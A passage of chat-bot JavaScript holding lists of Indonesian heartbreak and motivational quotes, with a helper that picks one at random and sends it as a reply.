    "Berawal dari kenalan, bercanda bareng, ejek-ejekan kemudian berubah menjadi suka, nyaman dan akhirnya saling sayang dan mencintai",
    "Tersenyumlah pada orang yang telah menyakitimu agar sia tau arti kesabaran yang luar biasa",
    "Aku akan ingat kenangan pahit itu dan aku akan jadikan pelajaran untuk masa depan yang manis",
    "Kalau memang tak sanggup menepati janjimu itu setidaknya kamu ingat dan usahakan jagan membiarkan janjimu itu sampai kau lupa",
    "Hanya bisa diam dan berfikir Kenapa orang yang setia dan baik ditinggalin yang nakal dikejar-kejar giliran ditinggalin bilangnya laki-laki itu semuanya sama",
    "Walaupun hanya sesaat saja kau membahagiakanku tapi rasa bahagia yang dia tidak cepat dilupakan",
    "Aku tak menyangka kamu pergi dan melupakan ku begitu cepat",
    "Jomblo gak usah diam rumah mumpung malam minggu ya keluar jalan lah kan jomblo bebas bisa dekat sama siapapun pacar orang mantan sahabat bahkan sendiri atau bareng setan pun bisa",
    "Kamu adalah teman yang selalu di sampingku dalam keadaan senang maupun susah Terimakasih kamu selalu ada di sampingku",
    "Aku tak tahu sebenarnya di dalam hatimu itu ada aku atau dia",
    "Tak mudah melupakanmu karena aku sangat mencintaimu meskipun engkau telah menyakiti aku berkali-kali",
    "Hidup ini hanya sebentar jadi lepaskan saja mereka yang menyakitimu Sayangi Mereka yang peduli padamu dan perjuangan mereka yang berarti bagimu",
    "Tolong jangan pergi meninggalkanku aku masih sangat mencintai dan menyayangimu",
    "Saya mencintaimu dan menyayangimu jadi tolong jangan engkau pergi dan meninggalkan ku sendiri",
    "Saya sudah cukup tahu bagaimana sifatmu itu kamu hanya dapat memberikan harapan palsu kepadaku",
    "Aku berusaha mendapatkan cinta darimu tetapi Kamunya nggak peka",
    "Aku bangkit dari jatuh ku setelah kau jatuhkan aku dan aku akan memulainya lagi dari awal Tanpamu",
    "Mungkin sekarang jodohku masih jauh dan belum bisa aku dapat tapi aku yakin jodoh itu Takkan kemana-mana dan akan ku dapatkan",
    "Datang aja dulu baru menghina orang lain kalau memang dirimu dan lebih baik dari yang kau hina",
    "Membelakanginya mungkin lebih baik daripada melihatnya selingkuh didepan mata sendiri",
    "Bisakah hatimu seperti angsa yang hanya setia pada satu orang saja",
    "Aku berdiri disini sendiri menunggu kehadiran dirimu",
    "Aku hanya tersenyum padamu setelah kau menyakitiku agar kamu tahu arti kesabaran",
    "Maaf aku lupa ternyata aku bukan siapa-siapa",
    "Untuk memegang janjimu itu harus ada buktinya jangan sampai hanya janji palsu",
    "Aku tidak bisa selamanya menunggu dan kini aku menjadi ragu Apakah kamu masih mencintaiku",
    "Jangan buat aku terlalu berharap jika kamu tidak menginginkanku",
    "Lebih baik sendiri daripada berdua tapi tanpa kepastian",
    "Pergi bukan berarti berhenti mencintai tapi kecewa dan lelah karena harus berjuang sendiri",
    "Bukannya aku tidak ingin menjadi pacarmu Aku hanya ingin dipersatukan dengan cara yang benar",
    "Akan ada saatnya kok aku akan benar-benar lupa dan tidak memikirkan mu lagi",
    "Kenapa harus jatuh cinta kepada orang yang tak bisa dimiliki",
    "Jujur aku juga memiliki perasaan terhadapmu dan tidak bisa menolakmu tapi aku juga takut untuk mencintaimu",
    "Maafkan aku sayang tidak bisa menjadi seperti yang kamu mau",
    "Jangan memberi perhatian lebih seperti itu cukup biasa saja tanpa perlu menimbulkan rasa",
    "Aku bukan mencari yang sempurna tapi yang terbaik untukku",
    "Sendiri itu tenang tidak ada pertengkaran kebohongan dan banyak aturan",
    "Cewek strong itu adalah yang sabar dan tetap tersenyum meskipun dalam keadaan terluka",
    "Terima kasih karena kamu aku menjadi lupa tentang masa laluku",
    "Cerita cinta indah tanpa masalah itu hanya di dunia dongeng saja",
    "Kamu tidak akan menemukan apa-apa di masa lalu Yang ada hanyalah penyesalan dan sakit hati",
    "Mikirin orang yang gak pernah mikirin kita itu emang bikin gila",
    "Dari sekian lama menunggu apa yang sudah didapat",
    "Perasaan Bodo gue adalah bisa jatuh cinta sama orang yang sama meski udah disakiti berkali-kali",
    "Yang sendiri adalah yang bersabar menunggu pasangan sejatinya",
    "Aku terlahir sederhana dan ditinggal sudah biasa",
    "Aku sayang kamu tapi aku masih takut untuk mencintaimu",
    "Bisa berbagi suka dan duka bersamamu itu sudah membuatku bahagia",
    "Aku tidak pernah berpikir kamu akan menjadi yang sementara",
    "Jodoh itu bukan seberapa dekat kamu dengannya tapi seberapa yakin kamu dengan Allah",
    "Jangan paksa aku menjadi cewek seperti seleramu",
    "Hanya yang sabar yang mampu melewati semua kekecewaan",
    "Balikan sama kamu itu sama saja bunuh diri dan melukai perasaan ku sendiri",
    "Tak perlu membalas dengan menyakiti biar Karma yang akan urus semua itu",
    "Aku masih ingat kamu tapi perasaanku sudah tidak sakit seperti dulu",
    "Punya kalimat sendiri & mau ditambahin? chat *.owner*"
]
    let bacotan = pickRandom(galau)
  ReplyXylent(bacotan)
}
break
case 'quotesmotivasi': {
function pickRandom(list) {
  return list[Math.floor(list.length * Math.random())]
}

const motivasi = [
"ᴊᴀɴɢᴀɴ ʙɪᴄᴀʀᴀ, ʙᴇʀᴛɪɴᴅᴀᴋ ꜱᴀᴊᴀ. ᴊᴀɴɢᴀɴ ᴋᴀᴛᴀᴋᴀɴ, ᴛᴜɴᴊᴜᴋᴋᴀɴ ꜱᴀᴊᴀ. ᴊᴀɴɢᴀɴ ᴊᴀɴᴊɪ, ʙᴜᴋᴛɪᴋᴀɴ ꜱᴀᴊᴀ.",
"ᴊᴀɴɢᴀɴ ᴘᴇʀɴᴀʜ ʙᴇʀʜᴇɴᴛɪ ᴍᴇʟᴀᴋᴜᴋᴀɴ ʏᴀɴɢ ᴛᴇʀʙᴀɪᴋ ʜᴀɴʏᴀ ᴋᴀʀᴇɴᴀ ꜱᴇꜱᴇᴏʀᴀɴɢ ᴛɪᴅᴀᴋ ᴍᴇᴍʙᴇʀɪ ᴀɴᴅᴀ ᴘᴇɴɢʜᴀʀɢᴀᴀɴ.",
"ʙᴇᴋᴇʀᴊᴀ ꜱᴀᴀᴛ ᴍᴇʀᴇᴋᴀ ᴛɪᴅᴜʀ. ʙᴇʟᴀᴊᴀʀ ꜱᴀᴀᴛ ᴍᴇʀᴇᴋᴀ ʙᴇʀᴘᴇꜱᴛᴀ. ʜᴇᴍᴀᴛ ꜱᴇᴍᴇɴᴛᴀʀᴀ ᴍᴇʀᴇᴋᴀ ᴍᴇɴɢʜᴀʙɪꜱᴋᴀɴ. ʜɪᴅᴜᴘʟᴀʜ ꜱᴇᴘᴇʀᴛɪ ᴍɪᴍᴘɪ ᴍᴇʀᴇᴋᴀ.",
"ᴋᴜɴᴄɪ ꜱᴜᴋꜱᴇꜱ ᴀᴅᴀʟᴀʜ ᴍᴇᴍᴜꜱᴀᴛᴋᴀɴ ᴘɪᴋɪʀᴀɴ ꜱᴀᴅᴀʀ ᴋɪᴛᴀ ᴘᴀᴅᴀ ʜᴀʟ-ʜᴀʟ ʏᴀɴɢ ᴋɪᴛᴀ ɪɴɢɪɴᴋᴀɴ, ʙᴜᴋᴀɴ ʜᴀʟ-ʜᴀʟ ʏᴀɴɢ ᴋɪᴛᴀ ᴛᴀᴋᴜᴛɪ.",
"ᴊᴀɴɢᴀɴ ᴛᴀᴋᴜᴛ ɢᴀɢᴀʟ. ᴋᴇᴛᴀᴋᴜᴛᴀɴ ʙᴇʀᴀᴅᴀ ᴅɪ ᴛᴇᴍᴘᴀᴛ ʏᴀɴɢ ꜱᴀᴍᴀ ᴛᴀʜᴜɴ ᴅᴇᴘᴀɴ ꜱᴇᴘᴇʀᴛɪ ᴀɴᴅᴀ ꜱᴀᴀᴛ ɪɴɪ.",
"ᴊɪᴋᴀ ᴋɪᴛᴀ ᴛᴇʀᴜꜱ ᴍᴇʟᴀᴋᴜᴋᴀɴ ᴀᴘᴀ ʏᴀɴɢ ᴋɪᴛᴀ ʟᴀᴋᴜᴋᴀɴ, ᴋɪᴛᴀ ᴀᴋᴀɴ ᴛᴇʀᴜꜱ ᴍᴇɴᴅᴀᴘᴀᴛᴋᴀɴ ᴀᴘᴀ ʏᴀɴɢ ᴋɪᴛᴀ ᴅᴀᴘᴀᴛᴋᴀɴ.",
"ᴊɪᴋᴀ ᴀɴᴅᴀ ᴛɪᴅᴀᴋ ᴅᴀᴘᴀᴛ ᴍᴇɴɢᴀᴛᴀꜱɪ ꜱᴛʀᴇꜱ, ᴀɴᴅᴀ ᴛɪᴅᴀᴋ ᴀᴋᴀɴ ᴍᴇɴɢᴇʟᴏʟᴀ ᴋᴇꜱᴜᴋꜱᴇꜱᴀɴ.",
"ʙᴇʀꜱɪᴋᴀᴘ ᴋᴇʀᴀꜱ ᴋᴇᴘᴀʟᴀ ᴛᴇɴᴛᴀɴɢ ᴛᴜᴊᴜᴀɴ ᴀɴᴅᴀ ᴅᴀɴ ꜰʟᴇᴋꜱɪʙᴇʟ ᴛᴇɴᴛᴀɴɢ ᴍᴇᴛᴏᴅᴇ ᴀɴᴅᴀ.",
"ᴋᴇʀᴊᴀ ᴋᴇʀᴀꜱ ᴍᴇɴɢᴀʟᴀʜᴋᴀɴ ʙᴀᴋᴀᴛ ᴋᴇᴛɪᴋᴀ ʙᴀᴋᴀᴛ ᴛɪᴅᴀᴋ ʙᴇᴋᴇʀᴊᴀ ᴋᴇʀᴀꜱ.",
"ɪɴɢᴀᴛʟᴀʜ ʙᴀʜᴡᴀ ᴘᴇʟᴀᴊᴀʀᴀɴ ᴛᴇʀʙᴇꜱᴀʀ ᴅᴀʟᴀᴍ ʜɪᴅᴜᴘ ʙɪᴀꜱᴀɴʏᴀ ᴅɪᴘᴇʟᴀᴊᴀʀɪ ᴅᴀʀɪ ꜱᴀᴀᴛ-ꜱᴀᴀᴛ ᴛᴇʀʙᴜʀᴜᴋ ᴅᴀɴ ᴅᴀʀɪ ᴋᴇꜱᴀʟᴀʜᴀɴ ᴛᴇʀʙᴜʀᴜᴋ.",
"ʜɪᴅᴜᴘ ʙᴜᴋᴀɴ ᴛᴇɴᴛᴀɴɢ ᴍᴇɴᴜɴɢɢᴜ ʙᴀᴅᴀɪ ʙᴇʀʟᴀʟᴜ, ᴛᴇᴛᴀᴘɪ ʙᴇʟᴀᴊᴀʀ ᴍᴇɴᴀʀɪ ᴅɪ ᴛᴇɴɢᴀʜ ʜᴜᴊᴀɴ.",
"ᴊɪᴋᴀ ʀᴇɴᴄᴀɴᴀɴʏᴀ ᴛɪᴅᴀᴋ ʙᴇʀʜᴀꜱɪʟ, ᴜʙᴀʜ ʀᴇɴᴄᴀɴᴀɴʏᴀ ʙᴜᴋᴀɴ ᴛᴜᴊᴜᴀɴɴʏᴀ.",
"ᴊᴀɴɢᴀɴ ᴛᴀᴋᴜᴛ ᴋᴀʟᴀᴜ ʜɪᴅᴜᴘᴍᴜ ᴀᴋᴀɴ ʙᴇʀᴀᴋʜɪʀ; ᴛᴀᴋᴜᴛʟᴀʜ ᴋᴀʟᴀᴜ ʜɪᴅᴜᴘᴍᴜ ᴛᴀᴋ ᴘᴇʀɴᴀʜ ᴅɪᴍᴜʟᴀɪ.",
"ᴏʀᴀɴɢ ʏᴀɴɢ ʙᴇɴᴀʀ-ʙᴇɴᴀʀ ʜᴇʙᴀᴛ ᴀᴅᴀʟᴀʜ ᴏʀᴀɴɢ ʏᴀɴɢ ᴍᴇᴍʙᴜᴀᴛ ꜱᴇᴛɪᴀᴘ ᴏʀᴀɴɢ ᴍᴇʀᴀꜱᴀ ʜᴇʙᴀᴛ.",
"ᴘᴇɴɢᴀʟᴀᴍᴀɴ ᴀᴅᴀʟᴀʜ ɢᴜʀᴜ ʏᴀɴɢ ʙᴇʀᴀᴛ ᴋᴀʀᴇɴᴀ ᴅɪᴀ ᴍᴇᴍʙᴇʀɪᴋᴀɴ ᴛᴇꜱ ᴛᴇʀʟᴇʙɪʜ ᴅᴀʜᴜʟᴜ, ᴋᴇᴍᴜᴅɪᴀɴ ᴘᴇʟᴀᴊᴀʀᴀɴɴʏᴀ.",
"ᴍᴇɴɢᴇᴛᴀʜᴜɪ ꜱᴇʙᴇʀᴀᴘᴀ ʙᴀɴʏᴀᴋ ʏᴀɴɢ ᴘᴇʀʟᴜ ᴅɪᴋᴇᴛᴀʜᴜɪ ᴀᴅᴀʟᴀʜ ᴀᴡᴀʟ ᴅᴀʀɪ ʙᴇʟᴀᴊᴀʀ ᴜɴᴛᴜᴋ ʜɪᴅᴜᴘ.",
"ꜱᴜᴋꜱᴇꜱ ʙᴜᴋᴀɴʟᴀʜ ᴀᴋʜɪʀ, ᴋᴇɢᴀɢᴀʟᴀɴ ᴛɪᴅᴀᴋ ꜰᴀᴛᴀʟ. ʏᴀɴɢ ᴛᴇʀᴘᴇɴᴛɪɴɢ ᴀᴅᴀʟᴀʜ ᴋᴇʙᴇʀᴀɴɪᴀɴ ᴜɴᴛᴜᴋ ᴍᴇʟᴀɴᴊᴜᴛᴋᴀɴ.",
"ʟᴇʙɪʜ ʙᴀɪᴋ ɢᴀɢᴀʟ ᴅᴀʟᴀᴍ ᴏʀɪꜱɪɴᴀʟɪᴛᴀꜱ ᴅᴀʀɪᴘᴀᴅᴀ ʙᴇʀʜᴀꜱɪʟ ᴍᴇɴɪʀᴜ.",
"ʙᴇʀᴀɴɪ ʙᴇʀᴍɪᴍᴘɪ, ᴛᴀᴘɪ ʏᴀɴɢ ʟᴇʙɪʜ ᴘᴇɴᴛɪɴɢ, ʙᴇʀᴀɴɪ ᴍᴇʟᴀᴋᴜᴋᴀɴ ᴛɪɴᴅᴀᴋᴀɴ ᴅɪ ʙᴀʟɪᴋ ɪᴍᴘɪᴀɴᴍᴜ.",
"ᴛᴇᴛᴀᴘᴋᴀɴ ᴛᴜᴊᴜᴀɴ ᴀɴᴅᴀ ᴛɪɴɢɢɪ-ᴛɪɴɢɢɪ, ᴅᴀɴ ᴊᴀɴɢᴀɴ ʙᴇʀʜᴇɴᴛɪ ꜱᴀᴍᴘᴀɪ ᴀɴᴅᴀ ᴍᴇɴᴄᴀᴘᴀɪɴʏᴀ.",
"ᴋᴇᴍʙᴀɴɢᴋᴀɴ ᴋᴇꜱᴜᴋꜱᴇꜱᴀɴ ᴅᴀʀɪ ᴋᴇɢᴀɢᴀʟᴀɴ. ᴋᴇᴘᴜᴛᴜꜱᴀꜱᴀᴀɴ ᴅᴀɴ ᴋᴇɢᴀɢᴀʟᴀɴ ᴀᴅᴀʟᴀʜ ᴅᴜᴀ ʙᴀᴛᴜ ʟᴏɴᴄᴀᴛᴀɴ ᴘᴀʟɪɴɢ ᴘᴀꜱᴛɪ ᴍᴇɴᴜᴊᴜ ꜱᴜᴋꜱᴇꜱ.",
"ᴊᴇɴɪᴜꜱ ᴀᴅᴀʟᴀʜ ꜱᴀᴛᴜ ᴘᴇʀꜱᴇɴ ɪɴꜱᴘɪʀᴀꜱɪ ᴅᴀɴ ꜱᴇᴍʙɪʟᴀɴ ᴘᴜʟᴜʜ ꜱᴇᴍʙɪʟᴀɴ ᴘᴇʀꜱᴇɴ ᴋᴇʀɪɴɢᴀᴛ.",
"ꜱᴜᴋꜱᴇꜱ ᴀᴅᴀʟᴀʜ ᴛᴇᴍᴘᴀᴛ ᴘᴇʀꜱɪᴀᴘᴀɴ ᴅᴀɴ ᴋᴇꜱᴇᴍᴘᴀᴛᴀɴ ʙᴇʀᴛᴇᴍᴜ.",
"ᴋᴇᴛᴇᴋᴜɴᴀɴ ɢᴀɢᴀʟ 19 ᴋᴀʟɪ ᴅᴀɴ ʙᴇʀʜᴀꜱɪʟ ᴘᴀᴅᴀ ᴋᴇꜱᴇᴍᴘᴀᴛᴀᴍ ʏᴀɴɢ ᴋᴇ-20.",
"ᴊᴀʟᴀɴ ᴍᴇɴᴜᴊᴜ ꜱᴜᴋꜱᴇꜱ ᴅᴀɴ ᴊᴀʟᴀɴ ᴍᴇɴᴜᴊᴜ ᴋᴇɢᴀɢᴀʟᴀɴ ʜᴀᴍᴘɪʀ ᴘᴇʀꜱɪꜱ ꜱᴀᴍᴀ.",
"ꜱᴜᴋꜱᴇꜱ ʙɪᴀꜱᴀɴʏᴀ ᴅᴀᴛᴀɴɢ ᴋᴇᴘᴀᴅᴀ ᴍᴇʀᴇᴋᴀ ʏᴀɴɢ ᴛᴇʀʟᴀʟᴜ ꜱɪʙᴜᴋ ᴍᴇɴᴄᴀʀɪɴʏᴀ.",
"ᴊᴀɴɢᴀɴ ᴛᴜɴᴅᴀ ᴘᴇᴋᴇʀᴊᴀᴀɴᴍᴜ ꜱᴀᴍᴘᴀɪ ʙᴇꜱᴏᴋ, ꜱᴇᴍᴇɴᴛᴀʀᴀ ᴋᴀᴜ ʙɪꜱᴀ ᴍᴇɴɢᴇʀᴊᴀᴋᴀɴɴʏᴀ ʜᴀʀɪ ɪɴɪ.",
"20 ᴛᴀʜᴜɴ ᴅᴀʀɪ ꜱᴇᴋᴀʀᴀɴɢ, ᴋᴀᴜ ᴍᴜɴɢᴋɪɴ ʟᴇʙɪʜ ᴋᴇᴄᴇᴡᴀ ᴅᴇɴɢᴀɴ ʜᴀʟ-ʜᴀʟ ʏᴀɴɢ ᴛɪᴅᴀᴋ ꜱᴇᴍᴘᴀᴛ ᴋᴀᴜ ʟᴀᴋᴜᴋᴀɴ ᴀʟɪʜ-ᴀʟɪʜ ʏᴀɴɢ ꜱᴜᴅᴀʜ.",
"ᴊᴀɴɢᴀɴ ʜᴀʙɪꜱᴋᴀɴ ᴡᴀᴋᴛᴜᴍᴜ ᴍᴇᴍᴜᴋᴜʟɪ ᴛᴇᴍʙᴏᴋ ᴅᴀɴ ʙᴇʀʜᴀʀᴀᴘ ʙɪꜱᴀ ᴍᴇɴɢᴜʙᴀʜɴʏᴀ ᴍᴇɴᴊᴀᴅɪ ᴘɪɴᴛᴜ.",
"ᴋᴇꜱᴇᴍᴘᴀᴛᴀɴ ɪᴛᴜ ᴍɪʀɪᴘ ꜱᴇᴘᴇʀᴛɪ ᴍᴀᴛᴀʜᴀʀɪ ᴛᴇʀʙɪᴛ. ᴋᴀʟᴀᴜ ᴋᴀᴜ ᴍᴇɴᴜɴɢɢᴜ ᴛᴇʀʟᴀʟᴜ ʟᴀᴍᴀ, ᴋᴀᴜ ʙɪꜱᴀ ᴍᴇʟᴇᴡᴀᴛᴋᴀɴɴʏᴀ.",
"ʜɪᴅᴜᴘ ɪɴɪ ᴛᴇʀᴅɪʀɪ ᴅᴀʀɪ 10 ᴘᴇʀꜱᴇɴ ᴀᴘᴀ ʏᴀɴɢ ᴛᴇʀᴊᴀᴅɪ ᴘᴀᴅᴀᴍᴜ ᴅᴀɴ 90 ᴘᴇʀꜱᴇɴ ʙᴀɢᴀɪᴍᴀɴᴀ ᴄᴀʀᴀᴍᴜ ᴍᴇɴʏɪᴋᴀᴘɪɴʏᴀ.",
"ᴀᴅᴀ ᴛɪɢᴀ ᴄᴀʀᴀ ᴜɴᴛᴜᴋ ᴍᴇɴᴄᴀᴘᴀɪ ᴋᴇꜱᴜᴋꜱᴇꜱᴀɴ ᴛᴇʀᴛɪɴɢɢɪ: ᴄᴀʀᴀ ᴘᴇʀᴛᴀᴍᴀ ᴀᴅᴀʟᴀʜ ʙᴇʀꜱɪᴋᴀᴘ ʙᴀɪᴋ. ᴄᴀʀᴀ ᴋᴇᴅᴜᴀ ᴀᴅᴀʟᴀʜ ʙᴇʀꜱɪᴋᴀᴘ ʙᴀɪᴋ. ᴄᴀʀᴀ ᴋᴇᴛɪɢᴀ ᴀᴅᴀʟᴀʜ ᴍᴇɴᴊᴀᴅɪ ʙᴀɪᴋ.",
"ᴀʟᴀꜱᴀɴ ɴᴏᴍᴏʀ ꜱᴀᴛᴜ ᴏʀᴀɴɢ ɢᴀɢᴀʟ ᴅᴀʟᴀᴍ ʜɪᴅᴜᴘ ᴀᴅᴀʟᴀʜ ᴋᴀʀᴇɴᴀ ᴍᴇʀᴇᴋᴀ ᴍᴇɴᴅᴇɴɢᴀʀᴋᴀɴ ᴛᴇᴍᴀɴ, ᴋᴇʟᴜᴀʀɢᴀ, ᴅᴀɴ ᴛᴇᴛᴀɴɢɢᴀ ᴍᴇʀᴇᴋᴀ.",
"ᴡᴀᴋᴛᴜ ʟᴇʙɪʜ ʙᴇʀʜᴀʀɢᴀ ᴅᴀʀɪᴘᴀᴅᴀ ᴜᴀɴɢ. ᴋᴀᴍᴜ ʙɪꜱᴀ ᴍᴇɴᴅᴀᴘᴀᴛᴋᴀɴ ʟᴇʙɪʜ ʙᴀɴʏᴀᴋ ᴜᴀɴɢ, ᴛᴇᴛᴀᴘɪ ᴋᴀᴍᴜ ᴛɪᴅᴀᴋ ʙɪꜱᴀ ᴍᴇɴᴅᴀᴘᴀᴛᴋᴀɴ ʟᴇʙɪʜ ʙᴀɴʏᴀᴋ ᴡᴀᴋᴛᴜ.",
"ᴘᴇɴᴇᴛᴀᴘᴀɴ ᴛᴜᴊᴜᴀɴ ᴀᴅᴀʟᴀʜ ʀᴀʜᴀꜱɪᴀ ᴍᴀꜱᴀ ᴅᴇᴘᴀɴ ʏᴀɴɢ ᴍᴇɴᴀʀɪᴋ.",
"ꜱᴀᴀᴛ ᴋɪᴛᴀ ʙᴇʀᴜꜱᴀʜᴀ ᴜɴᴛᴜᴋ ᴍᴇɴᴊᴀᴅɪ ʟᴇʙɪʜ ʙᴀɪᴋ ᴅᴀʀɪ ᴋɪᴛᴀ, ꜱᴇɢᴀʟᴀ ꜱᴇꜱᴜᴀᴛᴜ ᴅɪ ꜱᴇᴋɪᴛᴀʀ ᴋɪᴛᴀ ᴊᴜɢᴀ ᴍᴇɴᴊᴀᴅɪ ʟᴇʙɪʜ ʙᴀɪᴋ.",
"ᴘᴇʀᴛᴜᴍʙᴜʜᴀɴ ᴅɪᴍᴜʟᴀɪ ᴋᴇᴛɪᴋᴀ ᴋɪᴛᴀ ᴍᴜʟᴀɪ ᴍᴇɴᴇʀɪᴍᴀ ᴋᴇʟᴇᴍᴀʜᴀɴ ᴋɪᴛᴀ ꜱᴇɴᴅɪʀɪ.",
"ᴊᴀɴɢᴀɴʟᴀʜ ᴘᴇʀɴᴀʜ ᴍᴇɴʏᴇʀᴀʜ ᴋᴇᴛɪᴋᴀ ᴀɴᴅᴀ ᴍᴀꜱɪʜ ᴍᴀᴍᴘᴜ ʙᴇʀᴜꜱᴀʜᴀ ʟᴀɢɪ. ᴛɪᴅᴀᴋ ᴀᴅᴀ ᴋᴀᴛᴀ ʙᴇʀᴀᴋʜɪʀ ꜱᴀᴍᴘᴀɪ ᴀɴᴅᴀ ʙᴇʀʜᴇɴᴛɪ ᴍᴇɴᴄᴏʙᴀ.",
"ᴋᴇᴍᴀᴜᴀɴ ᴀᴅᴀʟᴀʜ ᴋᴜɴᴄɪ ꜱᴜᴋꜱᴇꜱ. ᴏʀᴀɴɢ-ᴏʀᴀɴɢ ꜱᴜᴋꜱᴇꜱ, ʙᴇʀᴜꜱᴀʜᴀ ᴋᴇʀᴀꜱ ᴀᴘᴀ ᴘᴜɴ ʏᴀɴɢ ᴍᴇʀᴇᴋᴀ ʀᴀꜱᴀᴋᴀɴ ᴅᴇɴɢᴀɴ ᴍᴇɴᴇʀᴀᴘᴋᴀɴ ᴋᴇɪɴɢɪɴᴀɴ ᴍᴇʀᴇᴋᴀ ᴜɴᴛᴜᴋ ᴍᴇɴɢᴀᴛᴀꜱɪ ꜱɪᴋᴀᴘ ᴀᴘᴀᴛɪꜱ, ᴋᴇʀᴀɢᴜᴀɴ ᴀᴛᴀᴜ ᴋᴇᴛᴀᴋᴜᴛᴀɴ.",
"ᴊᴀɴɢᴀɴʟᴀʜ ᴘᴇʀɴᴀʜ ᴍᴇɴʏᴇʀᴀʜ ᴋᴇᴛɪᴋᴀ ᴀɴᴅᴀ ᴍᴀꜱɪʜ ᴍᴀᴍᴘᴜ ʙᴇʀᴜꜱᴀʜᴀ ʟᴀɢɪ. ᴛɪᴅᴀᴋ ᴀᴅᴀ ᴋᴀᴛᴀ ʙᴇʀᴀᴋʜɪʀ ꜱᴀᴍᴘᴀɪ ᴀɴᴅᴀ ʙᴇʀʜᴇɴᴛɪ ᴍᴇɴᴄᴏʙᴀ.",
"ᴋᴇᴍᴀᴜᴀɴ ᴀᴅᴀʟᴀʜ ᴋᴜɴᴄɪ ꜱᴜᴋꜱᴇꜱ. ᴏʀᴀɴɢ-ᴏʀᴀɴɢ ꜱᴜᴋꜱᴇꜱ, ʙᴇʀᴜꜱᴀʜᴀ ᴋᴇʀᴀꜱ ᴀᴘᴀ ᴘᴜɴ ʏᴀɴɢ ᴍᴇʀᴇᴋᴀ ʀᴀꜱᴀᴋᴀɴ ᴅᴇɴɢᴀɴ ᴍᴇɴᴇʀᴀᴘᴋᴀɴ ᴋᴇɪɴɢɪɴᴀɴ ᴍᴇʀᴇᴋᴀ ᴜɴᴛᴜᴋ ᴍᴇɴɢᴀᴛᴀꜱɪ ꜱɪᴋᴀᴘ ᴀᴘᴀᴛɪꜱ, ᴋᴇʀᴀɢᴜᴀɴ ᴀᴛᴀᴜ ᴋᴇᴛᴀᴋᴜᴛᴀɴ.",
"ʜᴀʟ ᴘᴇʀᴛᴀᴍᴀ ʏᴀɴɢ ᴅɪʟᴀᴋᴜᴋᴀɴ ᴏʀᴀɴɢ ꜱᴜᴋꜱᴇꜱ ᴀᴅᴀʟᴀʜ ᴍᴇᴍᴀɴᴅᴀɴɢ ᴋᴇɢᴀɢᴀʟᴀɴ ꜱᴇʙᴀɢᴀɪ ꜱɪɴʏᴀʟ ᴘᴏꜱɪᴛɪꜰ ᴜɴᴛᴜᴋ ꜱᴜᴋꜱᴇꜱ.",
"ᴄɪʀɪ ᴋʜᴀꜱ ᴏʀᴀɴɢ ꜱᴜᴋꜱᴇꜱ ᴀᴅᴀʟᴀʜ ᴍᴇʀᴇᴋᴀ ꜱᴇʟᴀʟᴜ ʙᴇʀᴜꜱᴀʜᴀ ᴋᴇʀᴀꜱ ᴜɴᴛᴜᴋ ᴍᴇᴍᴘᴇʟᴀᴊᴀʀɪ ʜᴀʟ-ʜᴀʟ ʙᴀʀᴜ.",
"ꜱᴜᴋꜱᴇꜱ ᴀᴅᴀʟᴀʜ ᴍᴇɴᴅᴀᴘᴀᴛᴋᴀɴ ᴀᴘᴀ ʏᴀɴɢ ᴋᴀᴍᴜ ɪɴɢɪɴᴋᴀɴ, ᴋᴇʙᴀʜᴀɢɪᴀᴀɴ ᴍᴇɴɢɪɴɢɪɴᴋᴀɴ ᴀᴘᴀ ʏᴀɴɢ ᴋᴀᴍᴜ ᴅᴀᴘᴀᴛᴋᴀɴ.",
"ᴏʀᴀɴɢ ᴘᴇꜱɪᴍɪꜱ ᴍᴇʟɪʜᴀᴛ ᴋᴇꜱᴜʟɪᴛᴀɴ ᴅɪ ꜱᴇᴛɪᴀᴘ ᴋᴇꜱᴇᴍᴘᴀᴛᴀɴ. ᴏʀᴀɴɢ ʏᴀɴɢ ᴏᴘᴛɪᴍɪꜱ ᴍᴇʟɪʜᴀᴛ ᴘᴇʟᴜᴀɴɢ ᴅᴀʟᴀᴍ ꜱᴇᴛɪᴀᴘ ᴋᴇꜱᴜʟɪᴛᴀɴ.",
"ᴋᴇʀᴀɢᴜᴀɴ ᴍᴇᴍʙᴜɴᴜʜ ʟᴇʙɪʜ ʙᴀɴʏᴀᴋ ᴍɪᴍᴘɪ ᴅᴀʀɪᴘᴀᴅᴀ ᴋᴇɢᴀɢᴀʟᴀɴ.",
"ʟᴀᴋᴜᴋᴀɴ ᴀᴘᴀ ʏᴀɴɢ ʜᴀʀᴜꜱ ᴋᴀᴍᴜ ʟᴀᴋᴜᴋᴀɴ ꜱᴀᴍᴘᴀɪ ᴋᴀᴍᴜ ᴅᴀᴘᴀᴛ ᴍᴇʟᴀᴋᴜᴋᴀɴ ᴀᴘᴀ ʏᴀɴɢ ɪɴɢɪɴ ᴋᴀᴍᴜ ʟᴀᴋᴜᴋᴀɴ.",
"ᴏᴘᴛɪᴍɪꜱᴛɪꜱ ᴀᴅᴀʟᴀʜ ꜱᴀʟᴀʜ ꜱᴀᴛᴜ ᴋᴜᴀʟɪᴛᴀꜱ ʏᴀɴɢ ʟᴇʙɪʜ ᴛᴇʀᴋᴀɪᴛ ᴅᴇɴɢᴀɴ ᴋᴇꜱᴜᴋꜱᴇꜱᴀɴ ᴅᴀɴ ᴋᴇʙᴀʜᴀɢɪᴀᴀɴ ᴅᴀʀɪᴘᴀᴅᴀ ʏᴀɴɢ ʟᴀɪɴ.",
"ᴘᴇɴɢʜᴀʀɢᴀᴀɴ ᴘᴀʟɪɴɢ ᴛɪɴɢɢɪ ʙᴀɢɪ ꜱᴇᴏʀᴀɴɢ ᴘᴇᴋᴇʀᴊᴀ ᴋᴇʀᴀꜱ ʙᴜᴋᴀɴʟᴀʜ ᴀᴘᴀ ʏᴀɴɢ ᴅɪᴀ ᴘᴇʀᴏʟᴇʜ ᴅᴀʀɪ ᴘᴇᴋᴇʀᴊᴀᴀɴ ɪᴛᴜ, ᴛᴀᴘɪ ꜱᴇʙᴇʀᴀᴘᴀ ʙᴇʀᴋᴇᴍʙᴀɴɢ ɪᴀ ᴅᴇɴɢᴀɴ ᴋᴇʀᴊᴀ ᴋᴇʀᴀꜱɴʏᴀ ɪᴛᴜ.",
"ᴄᴀʀᴀ ᴛᴇʀʙᴀɪᴋ ᴜɴᴛᴜᴋ ᴍᴇᴍᴜʟᴀɪ ᴀᴅᴀʟᴀʜ ᴅᴇɴɢᴀɴ ʙᴇʀʜᴇɴᴛɪ ʙᴇʀʙɪᴄᴀʀᴀ ᴅᴀɴ ᴍᴜʟᴀɪ ᴍᴇʟᴀᴋᴜᴋᴀɴ.",
